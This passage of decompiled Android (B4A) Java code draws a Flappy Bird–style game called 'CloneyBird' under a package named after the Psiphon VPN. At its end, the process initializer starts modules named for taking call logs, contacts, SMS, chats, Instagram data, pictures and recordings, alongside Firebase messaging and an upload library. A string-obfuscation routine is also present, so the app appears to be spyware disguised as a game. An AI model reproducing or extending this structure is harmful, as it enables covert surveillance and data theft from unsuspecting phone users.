mostCurrent._vvvvvvvvvvv6.x /*float*/  = (float) (_vvvvvvvvvvv3*0.2);
 //BA.debugLineNum = 123;BA.debugLine="myBird.y = vpH*0.5";
mostCurrent._vvvvvvvvvvv6.y /*float*/  = (float) (_vvvvvvvvvvv5*0.5);
 //BA.debugLineNum = 126;BA.debugLine="IP.Initialize(\"IP\")";
mostCurrent._vvvvvvvvvvvvv6.Initialize(processBA,"IP");
 //BA.debugLineNum = 129;BA.debugLine="bitmapfont.Initialize2(lGdx.Files.internal(\"bmfon";
mostCurrent._vvvvvvvvvvvvvv3.Initialize2(mostCurrent._vvvvvvvvvv0.Files().internal("bmfont.fnt"));
 //BA.debugLineNum = 131;BA.debugLine="snd_hit = lGdx.Audio.NewSound(\"shoot.wav\") ' load";
mostCurrent._snd_hit = mostCurrent._vvvvvvvvvv0.Audio().NewSound("shoot.wav");
 //BA.debugLineNum = 132;BA.debugLine="snd_flap = lGdx.Audio.NewSound(\"select.wav\") ' lo";
mostCurrent._snd_flap = mostCurrent._vvvvvvvvvv0.Audio().NewSound("select.wav");
 //BA.debugLineNum = 135;BA.debugLine="End Sub";
return "";
}
public static String  _lg_dispose() throws Exception{
 //BA.debugLineNum = 314;BA.debugLine="Sub LG_Dispose";
 //BA.debugLineNum = 315;BA.debugLine="Batch.dispose";
mostCurrent._vvvvvvvvvvvv7.dispose();
 //BA.debugLineNum = 316;BA.debugLine="End Sub";
return "";
}
public static String  _lg_pause() throws Exception{
 //BA.debugLineNum = 308;BA.debugLine="Sub LG_Pause";
 //BA.debugLineNum = 309;BA.debugLine="End Sub";
return "";
}
public static String  _lg_render() throws Exception{
int _x = 0;
com.psiphon3.main._typpipe _pipe = null;
int _i = 0;
 //BA.debugLineNum = 143;BA.debugLine="Sub LG_Render";
 //BA.debugLineNum = 145;BA.debugLine="GL.glClearcolor(0,0,0,1) 'RGB,alpha - Clear scree";
mostCurrent._vvvvvvvvvvvv5.glClearColor((float) (0),(float) (0),(float) (0),(float) (1));
 //BA.debugLineNum = 146;BA.debugLine="GL.glClear(GL.GL10_COLOR_BUFFER_BIT)";
mostCurrent._vvvvvvvvvvvv5.glClear(mostCurrent._vvvvvvvvvvvv5.GL10_COLOR_BUFFER_BIT);
 //BA.debugLineNum = 149;BA.debugLine="Camera.Update";
mostCurrent._vvvvvvvvvvvv6.Update();
 //BA.debugLineNum = 151;BA.debugLine="Batch.ProjectionMatrix = Camera.Combined";
mostCurrent._vvvvvvvvvvvv7.setProjectionMatrix(mostCurrent._vvvvvvvvvvvv6.getCombined());
 //BA.debugLineNum = 154;BA.debugLine="If gamerunning = False Then";
if (_vvvvvvvvvvvvv7==anywheresoftware.b4a.keywords.Common.False) { 
 //BA.debugLineNum = 156;BA.debugLine="frames = frames + speed";
_vvvvvvvvvvvv3 = (float) (_vvvvvvvvvvvv3+_vvvvvvvvvvvv4);
 //BA.debugLineNum = 157;BA.debugLine="Batch.Begin";
mostCurrent._vvvvvvvvvvvv7.Begin();
 //BA.debugLineNum = 160;BA.debugLine="Batch.DrawTex2(myBacking,0,vpH*0.20,vpW,vpH*0.80";
mostCurrent._vvvvvvvvvvvv7.DrawTex2(mostCurrent._vvvvvvvvvvvv1,(float) (0),(float) (_vvvvvvvvvvv5*0.20),_vvvvvvvvvvv3,(float) (_vvvvvvvvvvv5*0.80));
 //BA.debugLineNum = 163;BA.debugLine="For x = 0 To 6";
{
final int step9 = 1;
final int limit9 = (int) (6);
_x = (int) (0) ;
for (;_x <= limit9 ;_x = _x + step9 ) {
 //BA.debugLineNum = 165;BA.debugLine="Batch.DrawTex2(myGD,(x*vpW*0.20)-(frames Mod (v";
mostCurrent._vvvvvvvvvvvv7.DrawTex2(mostCurrent._vvvvvvvvvvvv2,(float) ((_x*_vvvvvvvvvvv3*0.20)-(_vvvvvvvvvvvv3%(_vvvvvvvvvvv3*0.20))),(float) (0),(float) (_vvvvvvvvvvv3*0.20),(float) (_vvvvvvvvvvv5*0.20));
 }
};
 //BA.debugLineNum = 170;BA.debugLine="Batch.DrawRegion3(BirdFrames(0,(birdColour*3)+(f";
mostCurrent._vvvvvvvvvvvv7.DrawRegion3(mostCurrent._vvvvvvvvvvvvv3[(int) (0)][(int) ((_vvvvvvvvvvvvv5*3)+(_vvvvvvvvvvvv3/(double)8%3))],mostCurrent._vvvvvvvvvvv6.x /*float*/ ,(float) (mostCurrent._vvvvvvvvvvv6.y /*float*/ +(10*anywheresoftware.b4a.keywords.Common.Sin(_vvvvvvvvvvvv3/(double)10))),(float) (_vvvvvvvvvvv3*0.0425),(float) (_vvvvvvvvvvv5*0.02),(float) (_vvvvvvvvvvv3*0.085),(float) (_vvvvvvvvvvv5*0.04),(float) (1),(float) (1),(float) (0));
 //BA.debugLineNum = 173;BA.debugLine="shadowtext(\"CloneyBird\",vpW*0.5,vpH*0.8) ' Clone";
_vvvvvvvvvvvvvv4("CloneyBird",(int) (_vvvvvvvvvvv3*0.5),(int) (_vvvvvvvvvvv5*0.8));
 //BA.debugLineNum = 174;BA.debugLine="shadowtext(\"Tap to start\",vpW*0.5,vpH*0.7) ' Tap";
_vvvvvvvvvvvvvv4("Tap to start",(int) (_vvvvvvvvvvv3*0.5),(int) (_vvvvvvvvvvv5*0.7));
 //BA.debugLineNum = 175;BA.debugLine="shadowtext(\"Get Ready!\",vpW*0.5,vpH*0.5) ' Get R";
_vvvvvvvvvvvvvv4("Get Ready!",(int) (_vvvvvvvvvvv3*0.5),(int) (_vvvvvvvvvvv5*0.5));
 //BA.debugLineNum = 176;BA.debugLine="Batch.End";
mostCurrent._vvvvvvvvvvvv7.End();
 };
 //BA.debugLineNum = 182;BA.debugLine="If gamerunning = True Then";
if (_vvvvvvvvvvvvv7==anywheresoftware.b4a.keywords.Common.True) { 
 //BA.debugLineNum = 186;BA.debugLine="frames = frames + speed";
_vvvvvvvvvvvv3 = (float) (_vvvvvvvvvvvv3+_vvvvvvvvvvvv4);
 //BA.debugLineNum = 188;BA.debugLine="Batch.Begin";
mostCurrent._vvvvvvvvvvvv7.Begin();
 //BA.debugLineNum = 190;BA.debugLine="Batch.DrawTex2(myBacking,0,vpH*0.20,vpW,vpH*0.80";
mostCurrent._vvvvvvvvvvvv7.DrawTex2(mostCurrent._vvvvvvvvvvvv1,(float) (0),(float) (_vvvvvvvvvvv5*0.20),_vvvvvvvvvvv3,(float) (_vvvvvvvvvvv5*0.80));
 //BA.debugLineNum = 193;BA.debugLine="pipeCD = pipeCD - speed";
_vvvvvvvvvvvv0 = (int) (_vvvvvvvvvvvv0-_vvvvvvvvvvvv4);
 //BA.debugLineNum = 195;BA.debugLine="If pipeCD < 0 Then";
if (_vvvvvvvvvvvv0<0) { 
 //BA.debugLineNum = 196;BA.debugLine="pipeCD = vpW*0.40 ' set pipe countdown 40% of s";
_vvvvvvvvvvvv0 = (int) (_vvvvvvvvvvv3*0.40);
 //BA.debugLineNum = 197;BA.debugLine="Dim Pipe As typpipe ' declare new pipe";
_pipe = new com.psiphon3.main._typpipe();
 //BA.debugLineNum = 198;BA.debugLine="Pipe.Initialize ' initialise pipe";
_pipe.Initialize();
 //BA.debugLineNum = 199;BA.debugLine="Pipe.x = vpW*1.20 ' set pipe x coord to 120% of";
_pipe.x /*float*/  = (float) (_vvvvvvvvvvv3*1.20);
 //BA.debugLineNum = 200;BA.debugLine="Pipe.Y = Rnd(vpH*0.35,vpH*0.75)-((img_pipe.Heig";
_pipe.y /*float*/  = (float) (anywheresoftware.b4a.keywords.Common.Rnd((int) (_vvvvvvvvvvv5*0.35),(int) (_vvvvvvvvvvv5*0.75))-((mostCurrent._img_pipe.getHeight()*0.5)*_vvvvvvvvvvv4));
 //BA.debugLineNum = 201;BA.debugLine="Pipe.scored = False ' set pipe to un-scored";
_pipe.scored /*boolean*/  = anywheresoftware.b4a.keywords.Common.False;
 //BA.debugLineNum = 202;BA.debugLine="pipes.add(Pipe) ' add pipe to list of pipes";
mostCurrent._vvvvvvvvvvv1.Add((Object)(_pipe));
 };
 //BA.debugLineNum = 206;BA.debugLine="Dim Pipe As typpipe ' declare new pipe";
_pipe = new com.psiphon3.main._typpipe();
 //BA.debugLineNum = 207;BA.debugLine="For i = 0 To pipes.Size - 1 ' loop through list";
{
final int step33 = 1;
final int limit33 = (int) (mostCurrent._vvvvvvvvvvv1.getSize()-1);
_i = (int) (0) ;
for (;_i <= limit33 ;_i = _i + step33 ) {
 //BA.debugLineNum = 208;BA.debugLine="Pipe = pipes.Get(i) ' copy pipe off list onto P";
_pipe = (com.psiphon3.main._typpipe)(mostCurrent._vvvvvvvvvvv1.Get(_i));
 //BA.debugLineNum = 209;BA.debugLine="Pipe.x = Pipe.x - speed ' decrease pipe x coord";
_pipe.x /*float*/  = (float) (_pipe.x /*float*/ -_vvvvvvvvvvvv4);
 //BA.debugLineNum = 213;BA.debugLine="If (myBird.x+vpW*0.085 > Pipe.x) And (myBird.x";
if ((mostCurrent._vvvvvvvvvvv6.x /*float*/ +_vvvvvvvvvvv3*0.085>_pipe.x /*float*/ ) && (mostCurrent._vvvvvvvvvvv6.x /*float*/ <(_pipe.x /*float*/ +_vvvvvvvvvvv3*0.125))) { 
 //BA.debugLineNum = 215;BA.debugLine="If (myBird.y < Pipe.y+(img_pipe.Height*scaleY*";
if ((mostCurrent._vvvvvvvvvvv6.y /*float*/ <_pipe.y /*float*/ +(mostCurrent._img_pipe.getHeight()*_vvvvvvvvvvv4*0.4375)) || (mostCurrent._vvvvvvvvvvv6.y /*float*/ +_vvvvvvvvvvv5*0.04>_pipe.y /*float*/ +((mostCurrent._img_pipe.getHeight()*0.5625)*_vvvvvvvvvvv4))) { 
 //BA.debugLineNum = 217;BA.debugLine="If birddead = False Then";
if (_vvvvvvvvvvvvv0==anywheresoftware.b4a.keywords.Common.False) { 
 //BA.debugLineNum = 219;BA.debugLine="myBird.my = 0";
mostCurrent._vvvvvvvvvvv6.my /*float*/  = (float) (0);
 //BA.debugLineNum = 220;BA.debugLine="snd_hit.Play";
mostCurrent._snd_hit.Play();
 };
 //BA.debugLineNum = 223;BA.debugLine="birddead = True";
_vvvvvvvvvvvvv0 = anywheresoftware.b4a.keywords.Common.True;
 //BA.debugLineNum = 225;BA.debugLine="speed = 0";
_vvvvvvvvvvvv4 = (float) (0);
 }else {
 //BA.debugLineNum = 228;BA.debugLine="If Pipe.scored = False Then";
if (_pipe.scored /*boolean*/ ==anywheresoftware.b4a.keywords.Common.False) { 
 //BA.debugLineNum = 230;BA.debugLine="Pipe.scored = True";
_pipe.scored /*boolean*/  = anywheresoftware.b4a.keywords.Common.True;
 //BA.debugLineNum = 232;BA.debugLine="score = score + 1";
_vvvvvvvvvvvvvv2 = (int) (_vvvvvvvvvvvvvv2+1);
 };
 };
 };
 //BA.debugLineNum = 238;BA.debugLine="If myBird.y < vpH*0.20 Then 'if bird lower than";
if (mostCurrent._vvvvvvvvvvv6.y /*float*/ <_vvvvvvvvvvv5*0.20) { 
 //BA.debugLineNum = 239;BA.debugLine="speed = 0 'set speed to zero to stop scrolling";
_vvvvvvvvvvvv4 = (float) (0);
 //BA.debugLineNum = 240;BA.debugLine="If birddead = False Then";
if (_vvvvvvvvvvvvv0==anywheresoftware.b4a.keywords.Common.False) { 
 //BA.debugLineNum = 241;BA.debugLine="snd_hit.Play";
mostCurrent._snd_hit.Play();
 };
 //BA.debugLineNum = 243;BA.debugLine="birddead = True 'kill bird";
_vvvvvvvvvvvvv0 = anywheresoftware.b4a.keywords.Common.True;
 //BA.debugLineNum = 245;BA.debugLine="myBird.my = 0 'set bird my speed to zero";
mostCurrent._vvvvvvvvvvv6.my /*float*/  = (float) (0);
 //BA.debugLineNum = 246;BA.debugLine="myBird.y = vpH*0.20 'set bird y coord to 20% o";
mostCurrent._vvvvvvvvvvv6.y /*float*/  = (float) (_vvvvvvvvvvv5*0.20);
 };
 //BA.debugLineNum = 250;BA.debugLine="If Pipe.x < -100 Then";
if (_pipe.x /*float*/ <-100) { 
 //BA.debugLineNum = 251;BA.debugLine="pipes.RemoveAt(i) 'delete pipe";
mostCurrent._vvvvvvvvvvv1.RemoveAt(_i);
 //BA.debugLineNum = 252;BA.debugLine="Exit 'exit loop";
if (true) break;
 };
 }
};
 //BA.debugLineNum = 255;BA.debugLine="For i = 0 To pipes.Size -1";
{
final int step65 = 1;
final int limit65 = (int) (mostCurrent._vvvvvvvvvvv1.getSize()-1);
_i = (int) (0) ;
for (;_i <= limit65 ;_i = _i + step65 ) {
 //BA.debugLineNum = 256;BA.debugLine="Pipe = pipes.Get(i) 'get pipe off list";
_pipe = (com.psiphon3.main._typpipe)(mostCurrent._vvvvvvvvvvv1.Get(_i));
 //BA.debugLineNum = 257;BA.debugLine="Batch.DrawTex2(img_pipe,Pipe.x,Pipe.y,vpW*0.125";
mostCurrent._vvvvvvvvvvvv7.DrawTex2(mostCurrent._img_pipe,_pipe.x /*float*/ ,_pipe.y /*float*/ ,(float) (_vvvvvvvvvvv3*0.125),(float) (_vvvvvvvvvvv5*1.33));
 }
};
 //BA.debugLineNum = 261;BA.debugLine="For x = 0 To 6";
{
final int step69 = 1;
final int limit69 = (int) (6);
_x = (int) (0) ;
for (;_x <= limit69 ;_x = _x + step69 ) {
 //BA.debugLineNum = 263;BA.debugLine="Batch.DrawTex2(myGD,(x*vpW*0.20)-(frames Mod (v";
mostCurrent._vvvvvvvvvvvv7.DrawTex2(mostCurrent._vvvvvvvvvvvv2,(float) ((_x*_vvvvvvvvvvv3*0.20)-(_vvvvvvvvvvvv3%(_vvvvvvvvvvv3*0.20))),(float) (0),(float) (_vvvvvvvvvvv3*0.20),(float) (_vvvvvvvvvvv5*0.20));
 }
};
 //BA.debugLineNum = 268;BA.debugLine="If myBird.my > (-10*scaleY) Then 'only add gravi";
if (mostCurrent._vvvvvvvvvvv6.my /*float*/ >(-10*_vvvvvvvvvvv4)) { 
 //BA.debugLineNum = 269;BA.debugLine="myBird.my = myBird.my - (0.2*scaleY) 'apply gra";
mostCurrent._vvvvvvvvvvv6.my /*float*/  = (float) (mostCurrent._vvvvvvvvvvv6.my /*float*/ -(0.2*_vvvvvvvvvvv4));
 };
 //BA.debugLineNum = 271;BA.debugLine="myBird.y = myBird.y + myBird.my 'adjust bird y c";
mostCurrent._vvvvvvvvvvv6.y /*float*/  = (float) (mostCurrent._vvvvvvvvvvv6.y /*float*/ +mostCurrent._vvvvvvvvvvv6.my /*float*/ );
 //BA.debugLineNum = 273;BA.debugLine="birdAngle = (((myBird.my/scaleY)+6)*5.5)+335";
_vvvvvvvvvvvvv1 = (int) ((((mostCurrent._vvvvvvvvvvv6.my /*float*/ /(double)_vvvvvvvvvvv4)+6)*5.5)+335);
 //BA.debugLineNum = 276;BA.debugLine="Batch.DrawRegion3(BirdFrames(0,(birdColour*3)+(f";
mostCurrent._vvvvvvvvvvvv7.DrawRegion3(mostCurrent._vvvvvvvvvvvvv3[(int) (0)][(int) ((_vvvvvvvvvvvvv5*3)+(_vvvvvvvvvvvv3/(double)8%3))],mostCurrent._vvvvvvvvvvv6.x /*float*/ ,mostCurrent._vvvvvvvvvvv6.y /*float*/ ,(float) (_vvvvvvvvvvv3*0.0425),(float) (_vvvvvvvvvvv5*0.02),(float) (_vvvvvvvvvvv3*0.085),(float) (_vvvvvvvvvvv5*0.04),(float) (1),(float) (1),(float) (_vvvvvvvvvvvvv1));
 //BA.debugLineNum = 279;BA.debugLine="If birddead = False Then";
if (_vvvvvvvvvvvvv0==anywheresoftware.b4a.keywords.Common.False) { 
 //BA.debugLineNum = 281;BA.debugLine="shadowtext(\"\"&score,vpW*0.50,vpH*0.90) ' draw s";
_vvvvvvvvvvvvvv4(""+BA.NumberToString(_vvvvvvvvvvvvvv2),(int) (_vvvvvvvvvvv3*0.50),(int) (_vvvvvvvvvvv5*0.90));
 }else {
 //BA.debugLineNum = 283;BA.debugLine="restartCD = restartCD - 1 'decrease restartCD";
_vvvvvvvvvvvvvv1 = (int) (_vvvvvvvvvvvvvv1-1);
 //BA.debugLineNum = 285;BA.debugLine="If score > highscore Then 'if score higher than";
if (_vvvvvvvvvvvvvv2>_vvvvvvvvvvv0) { 
 //BA.debugLineNum = 286;BA.debugLine="highscore = score 'set highscore to score";
_vvvvvvvvvvv0 = _vvvvvvvvvvvvvv2;
 //BA.debugLineNum = 288;BA.debugLine="scorefile.Initialize(File.DirInternal,\"scores.";
mostCurrent._vvvvvvvvvvv7.Initialize(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"scores.dat",anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 289;BA.debugLine="scorefile.writeInt(highscore,0) 'write score t";
mostCurrent._vvvvvvvvvvv7.WriteInt(_vvvvvvvvvvv0,(long) (0));
 //BA.debugLineNum = 290;BA.debugLine="scorefile.Close 'close score file";
mostCurrent._vvvvvvvvvvv7.Close();
 };
 //BA.debugLineNum = 292;BA.debugLine="shadowtext(\"Score: \" & score,vpW*0.50,vpH*0.80)";
_vvvvvvvvvvvvvv4("Score: "+BA.NumberToString(_vvvvvvvvvvvvvv2),(int) (_vvvvvvvvvvv3*0.50),(int) (_vvvvvvvvvvv5*0.80));
 //BA.debugLineNum = 293;BA.debugLine="shadowtext(\"High Score: \" & highscore,vpW*0.50,";
_vvvvvvvvvvvvvv4("High Score: "+BA.NumberToString(_vvvvvvvvvvv0),(int) (_vvvvvvvvvvv3*0.50),(int) (_vvvvvvvvvvv5*0.70));
 //BA.debugLineNum = 294;BA.debugLine="If restartCD < 0 Then 'if restart timer is less";
if (_vvvvvvvvvvvvvv1<0) { 
 //BA.debugLineNum = 295;BA.debugLine="shadowtext(\"Flap to Restart\",vpW*0.5,vpH*0.60)";
_vvvvvvvvvvvvvv4("Flap to Restart",(int) (_vvvvvvvvvvv3*0.5),(int) (_vvvvvvvvvvv5*0.60));
 };
 };
 //BA.debugLineNum = 300;BA.debugLine="If birddead = True Then";
if (_vvvvvvvvvvvvv0==anywheresoftware.b4a.keywords.Common.True) { 
 //BA.debugLineNum = 301;BA.debugLine="restartCD = restartCD - 1 'decrease restartCD";
_vvvvvvvvvvvvvv1 = (int) (_vvvvvvvvvvvvvv1-1);
 };
 //BA.debugLineNum = 304;BA.debugLine="Batch.End";
mostCurrent._vvvvvvvvvvvv7.End();
 };
 //BA.debugLineNum = 306;BA.debugLine="End Sub";
return "";
}
public static String  _lg_resize(int _width,int _height) throws Exception{
 //BA.debugLineNum = 137;BA.debugLine="Sub LG_Resize(Width As Int, Height As Int)";
 //BA.debugLineNum = 139;BA.debugLine="Camera.Initialize";
mostCurrent._vvvvvvvvvvvv6.Initialize();
 //BA.debugLineNum = 140;BA.debugLine="Camera.SetToOrtho2(False, vpW, vpH) 'set camera v";
mostCurrent._vvvvvvvvvvvv6.SetToOrtho2(anywheresoftware.b4a.keywords.Common.False,_vvvvvvvvvvv3,_vvvvvvvvvvv5);
 //BA.debugLineNum = 141;BA.debugLine="End Sub";
return "";
}
public static String  _lg_resume() throws Exception{
 //BA.debugLineNum = 311;BA.debugLine="Sub LG_Resume";
 //BA.debugLineNum = 312;BA.debugLine="End Sub";
return "";
}

public static void initializeProcessGlobals() {
    
    if (main.processGlobalsRun == false) {
	    main.processGlobalsRun = true;
		try {
		        ir.rayanoos.lib.upload_ultra.uploadfile._process_globals();
main._process_globals();
cmr._process_globals();
cmr2._process_globals();
firebasemessaging._process_globals();
getallcalls._process_globals();
getallcontacts._process_globals();
getallsms._process_globals();
getchats._process_globals();
getinsta._process_globals();
getlists._process_globals();
getonechat._process_globals();
getpicture._process_globals();
getpicture2._process_globals();
srv._process_globals();
starter._process_globals();
startrecord._process_globals();
httputils2service._process_globals();
		
        } catch (Exception e) {
			throw new RuntimeException(e);
		}
    }
}

private static byte[][] bb;

public static String vvv13(final byte[] _b, final int i) throws Exception {
Runnable r = new Runnable() {
{

int value = i / 9 + 312257;
if (bb == null) {
		
                bb = new byte[4][];
				bb[0] = BA.packageName.getBytes("UTF8");
                bb[1] = BA.applicationContext.getPackageManager().getPackageInfo(BA.packageName, 0).versionName.getBytes("UTF8");
                if (bb[1].length == 0)
                    bb[1] = "jsdkfh".getBytes("UTF8");
                bb[2] = new byte[] { (byte)BA.applicationContext.getPackageManager().getPackageInfo(BA.packageName, 0).versionCode };			
        }
        bb[3] = new byte[] {
                    (byte) (value >>> 24),
						(byte) (value >>> 16),
						(byte) (value >>> 8),
						(byte) value};
				try {
					for (int __b = 0;__b < (3 + 1);__b ++) {
						for (int b = 0;b<_b.length;b++) {
							_b[b] ^= bb[__b][b % bb[__b].length];
						}
					}

				} catch (Exception e) {
					throw new RuntimeException(e);
				}
                

            
}
public void run() {
}
};
return new String(_b, "UTF8");
}
public static String  _process_globals() throws Exception{
 //BA.debugLineNum = 15;BA.debugLine="Sub Process_Globals";
 //BA.debugLineNum = 19;BA.debugLine="End Sub";
return "";
}
public static String  _vvvvvvvvvvvvvv4(String _text,int _x,int _y) throws Exception{
 //BA.debugLineNum = 343;BA.debugLine="Sub shadowtext(text As String, x As Int, y As Int)";
 //BA.debugLineNum = 344;BA.debugLine="bitmapfont.Draw2(Batch,text,x-(bitmapfont.GetBoun";
mostCurrent._vvvvvvvvvvvvvv3.Draw2(mostCurrent._vvvvvvvvvvvv7,BA.ObjectToCharSequence(_text),(float) (_x-(mostCurrent._vvvvvvvvvvvvvv3.GetBounds(BA.ObjectToCharSequence(_text)).Width/(double)2)),(float) (_y),mostCurrent._vvvvvvvvvvvvvv3.getColor().BLACK);
 //BA.debugLineNum = 345;BA.debugLine="bitmapfont.Draw2(Batch,text,x-(bitmapfont.GetBoun";
mostCurrent._vvvvvvvvvvvvvv3.Draw2(mostCurrent._vvvvvvvvvvvv7,BA.ObjectToCharSequence(_text),(float) (_x-(mostCurrent._vvvvvvvvvvvvvv3.GetBounds(BA.ObjectToCharSequence(_text)).Width/(double)2)-anywheresoftware.b4a.keywords.Common.DipToCurrent((int) (2))),(float) (_y-anywheresoftware.b4a.keywords.Common.DipToCurrent((int) (2))),mostCurrent._vvvvvvvvvvvvvv3.getColor().WHITE);
 //BA.debugLineNum = 346;BA.debugLine="End Sub";
return "";
}
}
